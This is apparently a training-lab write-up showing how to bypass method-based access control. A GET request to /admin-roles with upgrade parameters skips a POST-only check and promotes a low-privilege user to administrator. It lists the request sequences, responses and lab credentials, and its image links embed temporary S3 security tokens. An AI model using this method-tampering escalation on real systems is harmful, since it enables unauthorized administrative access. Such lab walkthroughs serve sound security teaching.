# Method-based access control can be circumvented

### Target Goal - 

Log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator

### Analysis/Exploitation -

<details><summary>Summary</summary>

We can see this request with administrator user.

```text
POST /admin-roles HTTP/1.1
...
username=carlos&action=upgrade

```

```text

POST /admin-roles - HTTP/1.1   -->401 Unauthorized
GET /admin - HTTP/1.1   -->400 Missing parameter'username'
```

With non privileged user, we  get 401 Unauthorized error.

But we can bypass the error with another type of request instead of using POST.

```text
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1 --> 302 Found
GET /admin --> 200 OK
```

</details>

familiarize yourself with the admin panel by logging in using the credentials `administrator:admin` 

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/3fea78d0-0b43-4ccf-a7b7-0409c6c0b92b/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4667LPQLELU%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204648Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFF8Z21oDBugaVLp%2B3e%2BN9VTIBMXnUb9KplP7%2B4CYYJsAiEAx1rr97jneWwTVfzpZThTh%2B0hzA0dJHr6Lsoacg6ZAYgqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDOtRW9CiqXoxQfrJJCrcA0B1a3G4hZ9A9kmpCKbL4D9VeCwOrzvUZ%2FrMVfW54Y5beQ%2F7pLvjXQDsGsImhuIznPA6av1gWBxRKVon%2F1WgA4wIKj3%2F66i5s5gBVYivOvXrQkjOPWNYz3uMJhO7W64yAPtBCwuTe4N2K1EKVP653vlPnfCNQet5a5vjbXmO9b1s48OrLYlX4fJJcCJv9thHLgp52cuY6hoBo4uy%2FwfsT0STuELZxxx9oGWBV5ovB5IRtiSFPFdqChZirdi4CJdY5KizzgldlSYYMIqwJLY%2BktT%2FORtiGJXVbxtNUeNw56o9lzM56gt%2FSh5xS8I4IXu%2FUv4JCGkWX3fXBwie9lDqMAgDc4WNbcvsgcn1FMEPw4qWGmlkeyEK%2B0HB0LtQn9a6GpgaM0PiPgqyS%2FDTBdCa4H0TPS%2BipKkRAzOoZdcG%2BxdRX6bQRpxmABEqpzKlpIRK%2Ft5oMkjHPS7Ptz2DlKBXGbGH%2BRGfaCroYkqtCtUi16AJWQ06YCgcbLKSB8c8jIDraacCByYiKOreNSKB0EPh8%2F75j%2BckOlelG7bmm8%2BxuT6stErwAYnCFbMMm0QEaI49EB2T%2BawLRcrAPSvwuozLoizyj%2FC4JzWTzo6Yx2PAtkIEuHyCFZcDQN7MVoOGMOHFotQGOqUBVKF6hiYl5T293MGx6Gg7%2BUx44fitW3FS8uPiFqblxaZfOylUG4h3ytd3xXvZ%2By%2FOqM%2BbUMTQoOJ2bSkpxpxNPaON91O7vAW0HGF1CAraSZ9oP3JS8SR6HdFc6eIDrbi7Q4uznKj%2Fbqb%2BaoyaQ0jq52v%2FeBAdNM0anEW2kXgyPsQb18lzWEwSxX%2BmsOVO6%2BEQ860kZUIkAba7sPbjZOhPUKxmEY24&X-Amz-Signature=faa681c67e4f955da8a876a41938e04dfa8727e0dec38bdeae0d5acc4aba6108&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

Here, administrator can upgrade or downgrade a user.

When we try to upgrade a user:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/bf966fe2-5feb-4e1c-a3a5-452eb29a929e/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4667LPQLELU%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204648Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFF8Z21oDBugaVLp%2B3e%2BN9VTIBMXnUb9KplP7%2B4CYYJsAiEAx1rr97jneWwTVfzpZThTh%2B0hzA0dJHr6Lsoacg6ZAYgqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDOtRW9CiqXoxQfrJJCrcA0B1a3G4hZ9A9kmpCKbL4D9VeCwOrzvUZ%2FrMVfW54Y5beQ%2F7pLvjXQDsGsImhuIznPA6av1gWBxRKVon%2F1WgA4wIKj3%2F66i5s5gBVYivOvXrQkjOPWNYz3uMJhO7W64yAPtBCwuTe4N2K1EKVP653vlPnfCNQet5a5vjbXmO9b1s48OrLYlX4fJJcCJv9thHLgp52cuY6hoBo4uy%2FwfsT0STuELZxxx9oGWBV5ovB5IRtiSFPFdqChZirdi4CJdY5KizzgldlSYYMIqwJLY%2BktT%2FORtiGJXVbxtNUeNw56o9lzM56gt%2FSh5xS8I4IXu%2FUv4JCGkWX3fXBwie9lDqMAgDc4WNbcvsgcn1FMEPw4qWGmlkeyEK%2B0HB0LtQn9a6GpgaM0PiPgqyS%2FDTBdCa4H0TPS%2BipKkRAzOoZdcG%2BxdRX6bQRpxmABEqpzKlpIRK%2Ft5oMkjHPS7Ptz2DlKBXGbGH%2BRGfaCroYkqtCtUi16AJWQ06YCgcbLKSB8c8jIDraacCByYiKOreNSKB0EPh8%2F75j%2BckOlelG7bmm8%2BxuT6stErwAYnCFbMMm0QEaI49EB2T%2BawLRcrAPSvwuozLoizyj%2FC4JzWTzo6Yx2PAtkIEuHyCFZcDQN7MVoOGMOHFotQGOqUBVKF6hiYl5T293MGx6Gg7%2BUx44fitW3FS8uPiFqblxaZfOylUG4h3ytd3xXvZ%2By%2FOqM%2BbUMTQoOJ2bSkpxpxNPaON91O7vAW0HGF1CAraSZ9oP3JS8SR6HdFc6eIDrbi7Q4uznKj%2Fbqb%2BaoyaQ0jq52v%2FeBAdNM0anEW2kXgyPsQb18lzWEwSxX%2BmsOVO6%2BEQ860kZUIkAba7sPbjZOhPUKxmEY24&X-Amz-Signature=82c3e9d1df83ffb671821be37dd187ff9a1672b1602bd39303d2cb8c900c816a&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**It’s sending a POST request to **`/admin-roles`**, and with the **`username`** and **`action`**.**

Now, let’s log out and login as user `wiener` to do vertical privilege escalation!

After login send any GET request to repeater and change the ** **location to** **`/admin-roles`

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/db04fb1e-ff4c-44b9-9f91-323f66a393fd/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4667LPQLELU%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204648Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFF8Z21oDBugaVLp%2B3e%2BN9VTIBMXnUb9KplP7%2B4CYYJsAiEAx1rr97jneWwTVfzpZThTh%2B0hzA0dJHr6Lsoacg6ZAYgqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDOtRW9CiqXoxQfrJJCrcA0B1a3G4hZ9A9kmpCKbL4D9VeCwOrzvUZ%2FrMVfW54Y5beQ%2F7pLvjXQDsGsImhuIznPA6av1gWBxRKVon%2F1WgA4wIKj3%2F66i5s5gBVYivOvXrQkjOPWNYz3uMJhO7W64yAPtBCwuTe4N2K1EKVP653vlPnfCNQet5a5vjbXmO9b1s48OrLYlX4fJJcCJv9thHLgp52cuY6hoBo4uy%2FwfsT0STuELZxxx9oGWBV5ovB5IRtiSFPFdqChZirdi4CJdY5KizzgldlSYYMIqwJLY%2BktT%2FORtiGJXVbxtNUeNw56o9lzM56gt%2FSh5xS8I4IXu%2FUv4JCGkWX3fXBwie9lDqMAgDc4WNbcvsgcn1FMEPw4qWGmlkeyEK%2B0HB0LtQn9a6GpgaM0PiPgqyS%2FDTBdCa4H0TPS%2BipKkRAzOoZdcG%2BxdRX6bQRpxmABEqpzKlpIRK%2Ft5oMkjHPS7Ptz2DlKBXGbGH%2BRGfaCroYkqtCtUi16AJWQ06YCgcbLKSB8c8jIDraacCByYiKOreNSKB0EPh8%2F75j%2BckOlelG7bmm8%2BxuT6stErwAYnCFbMMm0QEaI49EB2T%2BawLRcrAPSvwuozLoizyj%2FC4JzWTzo6Yx2PAtkIEuHyCFZcDQN7MVoOGMOHFotQGOqUBVKF6hiYl5T293MGx6Gg7%2BUx44fitW3FS8uPiFqblxaZfOylUG4h3ytd3xXvZ%2By%2FOqM%2BbUMTQoOJ2bSkpxpxNPaON91O7vAW0HGF1CAraSZ9oP3JS8SR6HdFc6eIDrbi7Q4uznKj%2Fbqb%2BaoyaQ0jq52v%2FeBAdNM0anEW2kXgyPsQb18lzWEwSxX%2BmsOVO6%2BEQ860kZUIkAba7sPbjZOhPUKxmEY24&X-Amz-Signature=14ef5e4953b4ae54d3353f7f9f08a014efe90c2dae57d128a9268747f367c1e3&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

As you can see, looks like we can access `/admin-roles` when we’re sending a GET request to `/admin-roles` without any parameters.

If we change it to POST method we  get 401 Unauthorized . **So we’re allowed to send a GET request to **`/admin-roles`


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/0d60d2ee-8640-49ac-b6b5-46faa4aa89f6/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4662QY657ZV%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204650Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAloYLzXspR4LDsnTTr%2FYDD%2Ff2Vbo9zEbLoNmL0%2BWotmAiEA3iialjBXGlCuD5T9evztQMpYu5%2Ff4ubZKdvi2dokraYqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDF42LvemFrLUeNWipCrcA5M6TBeOANFotfrU6W%2B0h96fVUf4ZzIUhDp3QR%2FRpIe3AsX9ZdnhnyfaneZ1jhW2zUuhK24JSOHllPkmB3GtRp%2FvIID0QuyzdyTw9VSen7t5r65halwah0QxlQFPJKF1Nz2sWel3wouGu0oWqY5eqlQAMX%2BmtItUypfFL0hoMOcV%2F%2BfiSTeKnBQRRn%2FRyujUevmOhT4x8zZiexs67Sv9NPuCYqdXoPyUUaVf%2BhwUTf5Fe%2BUnwaF%2FDkjhzOHXrzac8bx1dzedROUVV5aDzF1vXDRbqBAY9yEMQVI3B1PzhjR0ZN3u1WLsqfAa%2F2nROlkZXDSWg6FLZnB0MyrW0NxvOZ3NcBCwk%2FCsEjlE0I6v8Gs%2FoyZAymchS1axhO%2B7WSWfJC0VICjnuaz50k6SX7ypAhOvns6ZLghbdQlZU1TUCOu2sB1jzn%2Fy2ceYtNXGUya1secgV%2Fycq3I9HyC0GEQUt7Y7F9jbgC4sqNYJM2Mz6tUcXtOkCdT1z6LXmNDVjtBIRo%2FE6sQg4N9shW7o6aAV8Grvq4IHKDH5d7GKaDtvHw89lFG91IFHeIwsc9TKpTxaC%2FAO0cTTaUsROvLMjMM0TTK2jxeocZScdyYEwtLXpB6jgYD01RTjDq8RQ7P2MKbGotQGOqUBIfxkHCn90SPDZrYVl%2Fp8xJjCL1sPl2LDOcV4rvyMLFoBtytaBEV1xS9Fd9G38%2FOsKZIWDLFHoLRIkKUaCSF87pPKjdaW8vrW%2F4e8aGPRlop3PCe6IbQ8hWC4%2Fei9A1uTrN4mWpwOAsUc3CVG8VUMMyVZ2HuGM4N7qr4RYNlAvr6QNpUkLvPAH9B9kI658Dls09DIum1KXB%2BLtxJgVlZKF3w4DVdr&X-Amz-Signature=401ed990b44ba5c37a80e18edb6b2907cb3e86fc5a8bc5819c46394f18dbabf5&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


**send a GET request to **`/admin-roles`**, with parameters: **`username=wiener&action=upgrade`**:**

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/6012c499-f073-4ec4-873a-0494ba2fd88f/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4667LPQLELU%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204648Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFF8Z21oDBugaVLp%2B3e%2BN9VTIBMXnUb9KplP7%2B4CYYJsAiEAx1rr97jneWwTVfzpZThTh%2B0hzA0dJHr6Lsoacg6ZAYgqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDOtRW9CiqXoxQfrJJCrcA0B1a3G4hZ9A9kmpCKbL4D9VeCwOrzvUZ%2FrMVfW54Y5beQ%2F7pLvjXQDsGsImhuIznPA6av1gWBxRKVon%2F1WgA4wIKj3%2F66i5s5gBVYivOvXrQkjOPWNYz3uMJhO7W64yAPtBCwuTe4N2K1EKVP653vlPnfCNQet5a5vjbXmO9b1s48OrLYlX4fJJcCJv9thHLgp52cuY6hoBo4uy%2FwfsT0STuELZxxx9oGWBV5ovB5IRtiSFPFdqChZirdi4CJdY5KizzgldlSYYMIqwJLY%2BktT%2FORtiGJXVbxtNUeNw56o9lzM56gt%2FSh5xS8I4IXu%2FUv4JCGkWX3fXBwie9lDqMAgDc4WNbcvsgcn1FMEPw4qWGmlkeyEK%2B0HB0LtQn9a6GpgaM0PiPgqyS%2FDTBdCa4H0TPS%2BipKkRAzOoZdcG%2BxdRX6bQRpxmABEqpzKlpIRK%2Ft5oMkjHPS7Ptz2DlKBXGbGH%2BRGfaCroYkqtCtUi16AJWQ06YCgcbLKSB8c8jIDraacCByYiKOreNSKB0EPh8%2F75j%2BckOlelG7bmm8%2BxuT6stErwAYnCFbMMm0QEaI49EB2T%2BawLRcrAPSvwuozLoizyj%2FC4JzWTzo6Yx2PAtkIEuHyCFZcDQN7MVoOGMOHFotQGOqUBVKF6hiYl5T293MGx6Gg7%2BUx44fitW3FS8uPiFqblxaZfOylUG4h3ytd3xXvZ%2By%2FOqM%2BbUMTQoOJ2bSkpxpxNPaON91O7vAW0HGF1CAraSZ9oP3JS8SR6HdFc6eIDrbi7Q4uznKj%2Fbqb%2BaoyaQ0jq52v%2FeBAdNM0anEW2kXgyPsQb18lzWEwSxX%2BmsOVO6%2BEQ860kZUIkAba7sPbjZOhPUKxmEY24&X-Amz-Signature=fca6967f55c6b7a8ebf0c62124c208b6851162907001fa7a6101a7ad8abae74f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

